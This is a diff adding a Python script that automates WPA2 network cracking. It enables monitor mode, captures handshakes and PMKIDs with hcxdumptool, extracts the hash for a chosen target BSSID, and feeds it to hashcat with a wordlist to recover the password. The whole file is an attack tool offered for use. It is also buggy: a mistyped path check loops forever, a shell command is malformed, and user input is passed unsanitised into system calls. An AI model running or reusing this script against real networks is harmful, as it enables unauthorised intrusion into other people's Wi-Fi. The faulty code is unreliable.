@@ -1,0 +1,65 @@
+#!/usr/bin/python3
+
+
+import os , sys
+import termcolor
+import time
+from termcolor import colored , cprint 
+
+
+def ReconToCrack():
+    os.system("clear")
+    print("")
+    os.system("pyfiglet   -j center -w 80 -f future [+]Wpa2ToHashcat[+] --color=YELLOW ")
+    print("")
+    interface=input(termcolor.colored("[+]Monitor Mode : ","white",attrs=["bold"]))
+    os.system("airmon-ng start " + "\t" + interface )
+    print("")
+    os.system("iwconfig")#/usr/src/ReconToCrack/output/BSSID.txt
+    Hcx=input(termcolor.colored("[+]Enter Monitor Interface >> " ,"white",attrs=["bold"]))
+    Path=(" > /usr/src/ReconToCrack/output/BSSID.txt")
+    cprint("[+]After 1 Min type Ctrl-C ","yellow",attrs=["bold"])
+    os.system("cd /usr/src/ReconToCrack/hcxtools &&  sudo ./hcxdumptool --do_rcascan -i " +  "\t" + Hcx + "\t" +  Path)
+    time.sleep(3)
+    #os.system("gnome-terminal -- tail -f /root/ReconToCrack/output/BSSID.txt &")
+    time.sleep(5)
+    os.system("pkill hcxdumptool")
+    print("")
+    cprint("Start Capturing Hash Hcxdumptool Don't Close Tool","yellow",attrs=["bold"])
+    print("")
+    cprint("[+]After 6 Min type Ctrl-C ","yellow",attrs=["bold"])
+    os.system("cd /usr/src/ReconToCrack/hcxtools && sudo ./hcxdumptool  -o  /usr/src/ReconToCrack/output/HashCaptured.pcapng  --active_beacon --enable_status=15 -i " + "\t" + Hcx)
+    time.sleep(2)
+    print("")
+    print("")
+    cprint("[-]Stop Captureing Hash And Started To Converted File To Hashcat forma ...","yellow",attrs=["bold"])
+    os.system(" cd /usr/src/ReconToCrack/hcxtools && sudo hcxpcapngtool -o  /usr/src/ReconToCrack/output/Convert.hc22000 -E  /usr/src/ReconToCrack/output/Essid.txt   /usr/src/ReconToCrack/output/HashCaptured.pcapng")
+    print("")
+    print("")
+    cprint("[+]Done Your File Converted ...","yellow",attrs=["bold"]) 
+    print("")
+    print("")
+    cprint("[+]Check BSSID OF TARGET ","yellow",attrs=["bold"])
+    print("")
+    os.system("cat  /usr/src/ReconToCrack/output/BSSID.txt")
+    print("")
+    print("")
+    Extract=input(termcolor.colored("[+]Target Bssid : " , "red",attrs=["bold"]))
+    print("")
+    cprint("[+]Extract Hash From Converted File","yellow",attrs=["bold"])
+    print("")
+    Hacks=(">  /usr/src/ReconToCrack/Result/TargetHash.hc22000")
+    os.system("cat   /usr/src/ReconToCrack/output/Convert.hc22000 | grep" + "\t" + Extract + "\t" + Hacks)
+    if os.path.exists(" /usr/src/ReconToCrack/Result/TargetHash.hc22000"):
+       cprint("")
+       cprint("[+]Done TARGET FILE TargetHash.hc22000  ","yellow",attrs=["bold"])     
+       cprint("[+]Start Cracking ","yellow",attrs=["bold"]) 
+       print("")
+       world=input(termcolor.colored("[+]wordlists : " , "red",attrs=["bold"]))
+       print("")
+       os.system("cd /usr/src/ReconToCrack/hashcat sudo ./hashcat.bin -m 22000  /usr/src/ReconToCrack/Result/TargetHash.hc22000 " + "\t" + world) 
+       print("")
+       os.system("cat /root/.local/share/hashcat/hashcat.potfile")
+    else:
+          ReconToCrack()   
+ReconToCrack()
